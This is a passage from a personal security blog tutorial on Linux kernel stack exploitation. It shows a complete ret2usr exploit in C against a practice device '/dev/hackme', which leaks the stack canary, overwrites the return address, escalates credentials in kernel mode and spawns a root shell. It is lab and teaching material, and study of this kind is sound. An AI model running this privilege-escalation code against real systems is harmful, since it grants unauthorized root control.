+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void open_dev()</span><br><span class="line">&#123;</span><br><span class="line">	device_fd = open(device_name,O_RDWR);</span><br><span class="line">	if (device_fd &lt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		puts(&quot;[!] Cannot open device...\nExiting...&quot;);</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125; else </span><br><span class="line">		puts(&quot;[*] Opened device&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>To do ret2usr we must able to ROP -&gt; leak canary</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void leak_canary()</span><br><span class="line">&#123;</span><br><span class="line">	unsigned long long leak[4] = &#123;&#125;;</span><br><span class="line">	read(device_fd,leak,sizeof(leak));</span><br><span class="line">	canary = leak[2];</span><br><span class="line">	printf(&quot;[*] CANARY : 0x%llx\n&quot;,canary);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Now we set breakpoint at<br><img src="https://hackmd.io/_uploads/HJhtc4Hqp.png" alt="Screenshot 2024-01-29 205206"></p>
+<p><img src="https://hackmd.io/_uploads/H1Sc54B96.png" alt="Screenshot 2024-01-29 205351"></p>
+<p>It copy the what store at rsi to rdi with len 0x20</p>
+<p><img src="https://hackmd.io/_uploads/SJTiKErqa.png" alt="Screenshot 2024-01-29 210119"></p>
+<p>At offset 2 is canary<br><img src="https://hackmd.io/_uploads/HklcF4rqT.png" alt="image"></p>
+<p>Now we can just find the offset to overflow the save rip in <code>hackme_write</code><br>Note that smep is off so we can freely run userspace code in kernel space</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">void leo_quyen()</span><br><span class="line">&#123;</span><br><span class="line">	__asm__(</span><br><span class="line">	&quot;.intel_syntax noprefix;&quot;</span><br><span class="line">	&quot;movabs rax, 0xffffffff814c67f0;&quot;</span><br><span class="line">	&quot;xor rdi, rdi;&quot;</span><br><span class="line">	&quot;call rax;&quot;</span><br><span class="line">	&quot;mov rdi,rax;&quot;</span><br><span class="line">	&quot;movabs rax,0xffffffff814c6410;&quot;</span><br><span class="line">	&quot;call rax;&quot;</span><br><span class="line">	&quot;swapgs;&quot;</span><br><span class="line">    &quot;mov r15, user_ss;&quot;</span><br><span class="line">    &quot;push r15;&quot;</span><br><span class="line">    &quot;mov r15, user_sp;&quot;</span><br><span class="line">    &quot;push r15;&quot;</span><br><span class="line">    &quot;mov r15, user_rflags;&quot;</span><br><span class="line">    &quot;push r15;&quot;</span><br><span class="line">    &quot;mov r15, user_cs;&quot;</span><br><span class="line">    &quot;push r15;&quot;</span><br><span class="line">    &quot;mov r15, user_rip;&quot;</span><br><span class="line">    &quot;push r15;&quot;</span><br><span class="line">    &quot;iretq;&quot;</span><br><span class="line">	&quot;.att_syntax;&quot;</span><br><span class="line">		);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void overwrite()</span><br><span class="line">&#123;</span><br><span class="line">	unsigned long long payload[21] = &#123;&#125;;</span><br><span class="line">	for (int i =0;i&lt;=15;i++)</span><br><span class="line">		payload[i] = 0x6161616161616161;</span><br><span class="line">	payload[16] = canary ;</span><br><span class="line">	payload[17] = 0;</span><br><span class="line">	payload[18] = 0;</span><br><span class="line">	payload[19] = 0;</span><br><span class="line">	payload[20] = (unsigned long long )leo_quyen+8;</span><br><span class="line">	if (write(device_fd,payload,sizeof(payload)) &lt;0)</span><br><span class="line">	&#123;</span><br><span class="line">		puts(&quot;[!] Cannot write to device...\nExiting...&quot;);</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">		puts(&quot;[*] Write successfully&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Before run that code we need to save registers state</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void save_state()</span><br><span class="line">&#123;</span><br><span class="line">	__asm__(</span><br><span class="line">    &quot;.intel_syntax noprefix;&quot;</span><br><span class="line">    &quot;mov user_cs, cs;&quot;</span><br><span class="line">    &quot;mov user_ss, ss;&quot;</span><br><span class="line">    &quot;mov user_sp, rsp;&quot;</span><br><span class="line">    &quot;pushf;&quot;</span><br><span class="line">    &quot;pop user_rflags;&quot;</span><br><span class="line">    &quot;.att_syntax;&quot;</span><br><span class="line">    );</span><br><span class="line">    puts(&quot;[*] Saved state&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Before overflow<br><img src="https://hackmd.io/_uploads/HJbNFEH9T.png" alt="Screenshot 2024-01-29 211949"></p>
+<p>After overflow<br><img src="https://hackmd.io/_uploads/rJMXKVB9T.png" alt="Screenshot 2024-01-29 212119"></p>
+<ul>
+<li>Final exp:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define device_name &quot;/dev/hackme&quot;</span><br><span class="line">#define commit_creds 0xffffffffc000016a</span><br><span class="line">#define prepare_kernel_cred 0xffffffff814c67f0</span><br><span class="line"></span><br><span class="line">int device_fd ;</span><br><span class="line">unsigned long long canary;</span><br><span class="line"></span><br><span class="line">void open_dev()</span><br><span class="line">&#123;</span><br><span class="line">	device_fd = open(device_name,O_RDWR);</span><br><span class="line">	if (device_fd &lt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		puts(&quot;[!] Cannot open device...\nExiting...&quot;);</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125; else </span><br><span class="line">		puts(&quot;[*] Opened device&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void leak_canary()</span><br><span class="line">&#123;</span><br><span class="line">	unsigned long long leak[4] = &#123;&#125;;</span><br><span class="line">	read(device_fd,leak,sizeof(leak));</span><br><span class="line">	canary = leak[2];</span><br><span class="line">	printf(&quot;[*] CANARY : 0x%llx\n&quot;,canary);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void get_shell()</span><br><span class="line">&#123;</span><br><span class="line">	if (getuid()==0)</span><br><span class="line">	&#123;</span><br><span class="line">		puts(&quot;[!] Become ROOT&quot;);</span><br><span class="line">		system(&quot;/bin/sh&quot;);</span><br><span class="line">	&#125;else</span><br><span class="line">	&#123;	</span><br><span class="line">		puts(&quot;[*] Something wrong&quot;);</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned long long user_cs, user_ss, user_rflags, user_sp, user_rip = (unsigned long long)get_shell;</span><br><span class="line">void leo_quyen()</span><br><span class="line">&#123;</span><br><span class="line">	__asm__(</span><br><span class="line">	&quot;.intel_syntax noprefix;&quot;</span><br><span class="line">	&quot;movabs rax, 0xffffffff814c67f0;&quot;</span><br><span class="line">	&quot;xor rdi, rdi;&quot;</span><br><span class="line">	&quot;call rax;&quot;</span><br><span class="line">	&quot;mov rdi,rax;&quot;</span><br><span class="line">	&quot;movabs rax,0xffffffff814c6410;&quot;</span><br><span class="line">	&quot;call rax;&quot;</span><br><span class="line">	&quot;swapgs;&quot;</span><br><span class="line">    &quot;mov r15, user_ss;&quot;</span><br><span class="line">    &quot;push r15;&quot;</span><br><span class="line">    &quot;mov r15, user_sp;&quot;</span><br><span class="line">    &quot;push r15;&quot;</span><br><span class="line">    &quot;mov r15, user_rflags;&quot;</span><br><span class="line">    &quot;push r15;&quot;</span><br><span class="line">    &quot;mov r15, user_cs;&quot;</span><br><span class="line">    &quot;push r15;&quot;</span><br><span class="line">    &quot;mov r15, user_rip;&quot;</span><br><span class="line">    &quot;push r15;&quot;</span><br><span class="line">    &quot;iretq;&quot;</span><br><span class="line">	&quot;.att_syntax;&quot;</span><br><span class="line">		);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void overwrite()</span><br><span class="line">&#123;</span><br><span class="line">	unsigned long long payload[21] = &#123;&#125;;</span><br><span class="line">	for (int i =0;i&lt;=15;i++)</span><br><span class="line">		payload[i] = 0x6161616161616161;</span><br><span class="line">	payload[16] = canary ;</span><br><span class="line">	payload[17] = 0;</span><br><span class="line">	payload[18] = 0;</span><br><span class="line">	payload[19] = 0;</span><br><span class="line">	payload[20] = (unsigned long long )leo_quyen+8;</span><br><span class="line">	if (write(device_fd,payload,sizeof(payload)) &lt;0)</span><br><span class="line">	&#123;</span><br><span class="line">		puts(&quot;[!] Cannot write to device...\nExiting...&quot;);</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">		puts(&quot;[*] Write successfully&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void save_state()</span><br><span class="line">&#123;</span><br><span class="line">	__asm__(</span><br><span class="line">    &quot;.intel_syntax noprefix;&quot;</span><br><span class="line">    &quot;mov user_cs, cs;&quot;</span><br><span class="line">    &quot;mov user_ss, ss;&quot;</span><br><span class="line">    &quot;mov user_sp, rsp;&quot;</span><br><span class="line">    &quot;pushf;&quot;</span><br><span class="line">    &quot;pop user_rflags;&quot;</span><br><span class="line">    &quot;.att_syntax;&quot;</span><br><span class="line">    );</span><br><span class="line">    puts(&quot;[*] Saved state&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	save_state();</span><br><span class="line">	open_dev();</span><br><span class="line">	leak_canary();</span><br><span class="line">	overwrite();</span><br><span class="line">	return 0 ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/pr0cf5/kernel-exploit-practice/tree/master">https://github.com/pr0cf5/kernel-exploit-practice/tree/master</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/pr0cf5/kernel-exploit-practice/blob/master/bypass-smap/README.md">https://github.com/pr0cf5/kernel-exploit-practice/blob/master/bypass-smap/README.md</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="https://hackmd.io/_uploads/rJYR97M6h.png" data-sizes="auto" alt="ret2csu" class="lazyload">
+      
+      <a href="/2023/08/22/ret2csu/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          ret2csu
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Stack-based-exploits-in-Linux-kernel"><span class="toc-number">1.</span> <span class="toc-text">Stack-based exploits in Linux kernel</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mitigations"><span class="toc-number">1.1.</span> <span class="toc-text">Mitigations</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SMEP"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. SMEP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SMAP"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. SMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Kernel-Canary"><span class="toc-number">1.1.3.</span> <span class="toc-text">3. Kernel Canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-KASLR"><span class="toc-number">1.1.4.</span> <span class="toc-text">4. KASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-KPTI-Kernel-Page-Table-Isolation"><span class="toc-number">1.1.5.</span> <span class="toc-text">5. KPTI (Kernel Page-Table Isolation)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-KADR-Kernel-Address-Display-Restriction"><span class="toc-number">1.1.6.</span> <span class="toc-text">6. KADR (Kernel Address Display Restriction)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-base-technique"><span class="toc-number">1.2.</span> <span class="toc-text">Stack-base technique</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-ret2usr"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. ret2usr</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Requirements"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">Requirements :</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ideas"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">Ideas:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Steps"><span class="toc-number">1.2.1.2.1.</span> <span class="toc-text">Steps:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Details"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">Details</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Save-registers-state"><span class="toc-number">1.2.1.3.1.</span> <span class="toc-text">Save registers state</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Escalate-privilege-switch-to-user-mode-restore-states"><span class="toc-number">1.2.1.3.2.</span> <span class="toc-text">Escalate privilege + switch to user mode + restore states</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Bypass-SMEP-SMAP"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. Bypass SMEP&#x2F;SMAP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#a-Overwrite-CR4-register"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">a. Overwrite CR4 register</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#b-ROPchain"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">b. ROPchain</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Can-overwrite-more-that-return-address"><span class="toc-number">1.2.2.2.1.</span> <span class="toc-text">Can overwrite more that return address</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Can-overwrite-only-return-address-stack-pivot"><span class="toc-number">1.2.2.2.2.</span> <span class="toc-text">Can overwrite only return address (stack pivot)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-KPTI-trampoline-KPTI-bypass"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. KPTI trampoline (KPTI bypass)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#KPTI-trampoline"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">KPTI trampoline</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-modprobe-path"><span class="toc-number">1.2.4.</span> <span class="toc-text">4. modprobe_path</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Debug-DEMO"><span class="toc-number">1.3.</span> <span class="toc-text">Debug + DEMO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Debug"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. Debug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Demo-ret2usr"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. Demo ret2usr</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">1.4.</span> <span class="toc-text">References:</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/../images/avatar.jpg" data-sizes="auto" alt="whoisthatguy" class="lazyload">
+  <div class="sidebar-author-name">whoisthatguy</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">7</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/wh0isthatguy itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a href=https://twitter.com/im_whoisthatguy itemprop="url" target="_blank" aria-label="twitter"></a>
+    </div>
+  
+    <div class="icon-discord sidebar-social-icon">
+      <a href=https://discordapp.com/users/wh0isthatguy itemprop="url" target="_blank" aria-label="discord"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2024
+      <span class="footer-info-sep"></span>
+      whoisthatguy
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        10.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:03
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Stack-based-exploits-in-Linux-kernel"><span class="toc-number">1.</span> <span class="toc-text">Stack-based exploits in Linux kernel</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mitigations"><span class="toc-number">1.1.</span> <span class="toc-text">Mitigations</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SMEP"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. SMEP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SMAP"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. SMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Kernel-Canary"><span class="toc-number">1.1.3.</span> <span class="toc-text">3. Kernel Canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-KASLR"><span class="toc-number">1.1.4.</span> <span class="toc-text">4. KASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-KPTI-Kernel-Page-Table-Isolation"><span class="toc-number">1.1.5.</span> <span class="toc-text">5. KPTI (Kernel Page-Table Isolation)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-KADR-Kernel-Address-Display-Restriction"><span class="toc-number">1.1.6.</span> <span class="toc-text">6. KADR (Kernel Address Display Restriction)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-base-technique"><span class="toc-number">1.2.</span> <span class="toc-text">Stack-base technique</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-ret2usr"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. ret2usr</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Requirements"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">Requirements :</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ideas"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">Ideas:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Steps"><span class="toc-number">1.2.1.2.1.</span> <span class="toc-text">Steps:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Details"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">Details</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Save-registers-state"><span class="toc-number">1.2.1.3.1.</span> <span class="toc-text">Save registers state</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Escalate-privilege-switch-to-user-mode-restore-states"><span class="toc-number">1.2.1.3.2.</span> <span class="toc-text">Escalate privilege + switch to user mode + restore states</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Bypass-SMEP-SMAP"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. Bypass SMEP&#x2F;SMAP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#a-Overwrite-CR4-register"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">a. Overwrite CR4 register</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#b-ROPchain"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">b. ROPchain</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Can-overwrite-more-that-return-address"><span class="toc-number">1.2.2.2.1.</span> <span class="toc-text">Can overwrite more that return address</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Can-overwrite-only-return-address-stack-pivot"><span class="toc-number">1.2.2.2.2.</span> <span class="toc-text">Can overwrite only return address (stack pivot)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-KPTI-trampoline-KPTI-bypass"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. KPTI trampoline (KPTI bypass)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#KPTI-trampoline"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">KPTI trampoline</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-modprobe-path"><span class="toc-number">1.2.4.</span> <span class="toc-text">4. modprobe_path</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Debug-DEMO"><span class="toc-number">1.3.</span> <span class="toc-text">Debug + DEMO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Debug"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. Debug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Demo-ret2usr"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. Demo ret2usr</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">1.4.</span> <span class="toc-text">References:</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/../images/avatar.jpg" data-sizes="auto" alt="whoisthatguy" class="lazyload">
+  <div class="sidebar-author-name">whoisthatguy</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
